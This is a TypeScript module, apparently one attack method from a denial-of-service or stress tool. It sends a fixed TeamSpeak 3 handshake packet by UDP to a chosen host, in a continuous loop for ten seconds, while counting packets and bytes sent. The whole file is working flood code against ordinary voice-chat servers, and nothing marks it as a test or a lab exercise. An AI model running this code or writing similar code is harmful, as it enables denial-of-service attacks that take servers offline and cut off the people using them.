import * as dgram from "dgram"

function parseUrl(url: string): { host: string; port: number } {
  const u = new URL(url.startsWith("http") ? url : `http://${url}`)
  return {
    host: u.hostname,
    port: parseInt(u.port) || 9987,
  }
}

const TS3_PAYLOAD = Buffer.from([0x05, 0xca, 0x7f, 0x16, 0x9c, 0x11, 0xf9, 0x89, 0x00, 0x00, 0x00, 0x00, 0x02])

export async function flood(
  url: string,
  _rpc: number,
  onStats: (req: number, bytes: number) => void
): Promise<void> {
  const { host, port } = parseUrl(url)

  return new Promise((resolve) => {
    const sock = dgram.createSocket("udp4")
    const send = () => {
      try {
        sock.send(TS3_PAYLOAD, port, host, () => {
          onStats(1, TS3_PAYLOAD.length)
          setImmediate(send)
        })
      } catch {
        sock.close()
        resolve()
      }
    }
    sock.on("error", () => resolve())
    send()
    setTimeout(() => {
      sock.close()
      resolve()
    }, 10000)
  })
}
